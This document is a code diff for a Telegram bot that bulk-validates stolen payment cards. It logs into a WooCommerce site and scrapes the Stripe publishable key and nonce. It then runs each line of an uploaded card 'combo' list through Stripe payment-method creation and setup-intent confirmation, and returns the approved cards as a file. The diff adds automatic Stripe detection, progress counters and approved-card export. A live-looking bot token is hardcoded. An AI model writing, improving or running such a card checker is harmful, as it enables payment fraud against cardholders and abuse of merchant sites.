@@ -4,9 +4,9 @@ import threading
 import logging
 import json
 from bs4 import BeautifulSoup
-from telegram import Update
-from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
 from io import BytesIO
+from telegram import Update, Document
+from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
 
 BOT_TOKEN = "7248159727:AAEzc2CNStU6H8F3zD4Y5CFIYRSkyhO_TiQ"
 
@@ -66,13 +66,13 @@ async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     args = context.args
     if not args or len(args) < 1 or '|' not in args[0]:
-        await update.message.reply_text("Usage: /addsitelogin site|email|password")
+        await update.message.reply_text("Usage: /addsitelogin site.com|email|password")
         return
 
     site, email, password = args[0].split("|")
     session = requests.Session()
-
     success, resp_html = try_login(site, email, password, session)
+
     if not success:
         await update.message.reply_text("Login failed.")
         return
@@ -82,7 +82,7 @@ async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "site": site,
             "email": email,
             "password": password,
-            "session": session,
+            "session": session
         }
 
     await update.message.reply_text("Login successful! Now send the Add Payment Method URL.")
@@ -95,8 +95,26 @@ async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     url = update.message.text
-    user_data[user_id]["check_url"] = url
-    await update.message.reply_text("Payment Method URL saved. Now upload a .txt combo list.")
+    session = user_data[user_id]["session"]
+    r = session.get(url, headers=get_headers())
+    html = r.text
+
+    stripe_type = detect_stripe_type(html)
+    pk = extract_pk(html)
+
+    if not pk or stripe_type == "unknown":
+        await update.message.reply_text("Could not detect Stripe setup or pk key.")
+        return
+
+    with lock:
+        user_data[user_id]["check_url"] = url
+        user_data[user_id]["stripe_type"] = stripe_type
+        user_data[user_id]["pk"] = pk
+
+    await update.message.reply_text(
+        f"Payment Method URL saved!\n\nDetected:\n• Stripe Type: `{stripe_type}`\n• PK: `{pk}`",
+        parse_mode='Markdown'
+    )
 
 
 def parse_card(card):
@@ -108,27 +126,25 @@ def check_card(card, data):
     try:
         parsed = parse_card(card)
         if not parsed:
-            return f"{card} -> Invalid format"
+            return f"{card} -> ❌ Invalid format"
         cc, mm, yy, cvv = parsed
         if len(yy) == 2:
             yy = "20" + yy
 
         session = data["session"]
-        site = data["site"]
         check_url = data["check_url"]
 
-        # Re-fetch to get fresh pk and nonce
+        # Always re-fetch for fresh ajax_nonce
         r = session.get(check_url, headers=get_headers())
         html = r.text
+
+        ajax_nonce_match = re.search(r'"(\w{10,})"', html)
+        ajax_nonce = ajax_nonce_match.group(1) if ajax_nonce_match else None
         pk = extract_pk(html)
-        stripe_type = detect_stripe_type(html)
-        ajax_nonce = re.search(r'"ajax_nonce":"(\w+)"', html)
-        ajax_nonce = ajax_nonce.group(1) if ajax_nonce else None
+        if not pk or not ajax_nonce:
+            return f"{card} -> ⚠️ Error: Missing pk or nonce"
 
-        if not pk or stripe_type != "setup_intent":
-            return f"{card} -> Error: Unable to extract pk or setup_intent"
-
-        # Step 1: create payment method with pk
+        # Create payment method
         r = requests.post(
             "https://api.stripe.com/v1/payment_methods",
             headers={"Authorization": f"Bearer {pk}"},
@@ -142,77 +158,73 @@ def check_card(card, data):
         )
         stripe_resp = r.json()
         if 'error' in stripe_resp:
-            return f"{card} -> Declined ❌\n{stripe_resp['error'].get('message', 'Unknown error')}"
+            return f"{card} -> ❌ Declined\n`{stripe_resp['error']['message']}`"
 
         pm_id = stripe_resp['id']
-
-        # Step 2: WooCommerce AJAX call
+        site = data['site']
         payload = {
             'action': 'create_and_confirm_setup_intent',
             'wc-stripe-payment-method': pm_id,
             'wc-stripe-payment-type': 'card',
             '_ajax_nonce': ajax_nonce
         }
-
         ajax_url = f"https://{site}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
         final = session.post(ajax_url, data=payload, headers={"X-Requested-With": "XMLHttpRequest"})
-        json_resp = final.json()
 
+        json_resp = final.json()
         if json_resp.get("success"):
-            return f"{card} -> Approved ✅"
-        else:
-            return f"{card} -> Declined ❌"
+            return f"{card} -> ✅ Approved"
+        return f"{card} -> ❌ Declined"
 
     except Exception as e:
-        return f"{card} -> Error: {str(e)}"
+        return f"{card} -> ⚠️ Error: {str(e)}"
 
 
 async def handle_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in user_data:
-        await update.message.reply_text("Please login and set the payment URL first.")
+        await update.message.reply_text("Please login and set payment URL first.")
         return
 
-    doc = update.message.document
-    if not doc.file_name.endswith(".txt"):
-        await update.message.reply_text("Please upload a valid .txt file.")
-        return
-
-    file = await doc.get_file()
+    file = await update.message.document.get_file()
     content = await file.download_as_bytearray()
     lines = content.decode().splitlines()
 
-    results = []
+    msg = await update.message.reply_text("Processing combos...")
+    stats = {"total": 0, "approved": 0, "declined": 0, "error": 0}
+    approved_cards = []
+
     for card in lines:
-        result = check_card(card.strip(), user_data[user_id])
-        results.append(result)
-        await update.message.reply_text(result)
+        stats["total"] += 1
+        result = check_card(card, user_data[user_id])
 
-    approved = [r for r in results if "Approved" in r]
-    declined = [r for r in results if "Declined" in r]
-    errors = [r for r in results if "Error" in r]
+        if "✅ Approved" in result:
+            stats["approved"] += 1
+            approved_cards.append(card)
+        elif "Declined" in result:
+            stats["declined"] += 1
+        else:
+            stats["error"] += 1
 
-    summary = (
-        f"**Check Complete**\n"
-        f"Total: {len(lines)}\n"
-        f"✅ Approved: {len(approved)}\n"
-        f"❌ Declined: {len(declined)}\n"
-        f"⚠️ Errors: {len(errors)}"
-    )
-    await update.message.reply_text(summary, parse_mode="Markdown")
+        await msg.edit_text(
+            f"Checking...\n"
+            f"✅ Approved: {stats['approved']}\n"
+            f"❌ Declined: {stats['declined']}\n"
+            f"⚠️ Error: {stats['error']}\n"
+            f"📊 Total: {stats['total']}"
+        )
 
-    if approved:
-        approved_file = BytesIO("\n".join(approved).encode())
-        approved_file.name = "approved.txt"
-        await update.message.reply_document(approved_file)
+    if approved_cards:
+        buffer = BytesIO("\n".join(approved_cards).encode())
+        buffer.name = "approved.txt"
+        await update.message.reply_document(document=buffer, filename="approved.txt", caption="✅ Approved Cards")
+    else:
+        await update.message.reply_text("No approved cards found.")
 
 
 if __name__ == "__main__":
     app = ApplicationBuilder().token(BOT_TOKEN).build()
-
     app.add_handler(CommandHandler("addsitelogin", addsitelogin))
-    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_url))
-    app.add_handler(MessageHandler(filters.Document.MimeType("text/plain"), handle_txt))
-
-    print("Bot is running...")
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_url))
+    app.add_handler(MessageHandler(filters.Document.FILE_EXTENSION("txt"), handle_txt))
     app.run_polling()
